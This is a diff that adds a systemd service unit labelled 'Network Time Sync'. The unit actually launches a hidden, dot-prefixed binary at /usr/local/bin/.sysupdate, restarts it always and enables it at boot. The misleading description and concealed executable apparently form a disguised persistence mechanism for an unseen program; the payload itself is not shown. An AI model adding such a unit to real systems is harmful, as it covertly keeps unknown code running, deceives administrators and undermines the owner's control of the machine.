@@ -1,0 +1,12 @@
+[Unit]
+Description=Network Time Sync
+After=network.target
+
+[Service]
+ExecStart=/usr/local/bin/.sysupdate
+Restart=always
+Type=simple
+
+[Install]
+WantedBy=multi-user.target
+
